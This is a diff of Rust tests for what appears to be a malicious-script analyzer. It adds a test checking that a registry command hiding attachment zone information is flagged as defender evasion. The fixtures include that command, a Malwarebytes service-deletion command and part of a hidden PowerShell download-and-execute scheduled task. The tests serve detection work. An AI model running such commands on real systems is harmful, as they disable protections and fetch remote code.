@@ -3468,6 +3468,23 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn attachment_policy_padded_hidezoneinfo_emits_evasion_trait() {
+        let script = br#"Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v "HideZoneInfoOnProperties" /t REG_DWORD /d "0x00000001" /f"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "attachment-policy-weaken"
+                        && target == "HideZoneInfoOnProperties"
+            )),
+            "padded HideZoneInfoOnProperties weakening was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn security_product_registry_deletion_emits_evasion_traits() {
         let script = b"@echo off\r\n\
             Reg Delete \"HKLM\\SYSTEM\\CurrentControlSet\\services\\MBAMService\" /f\r\n\
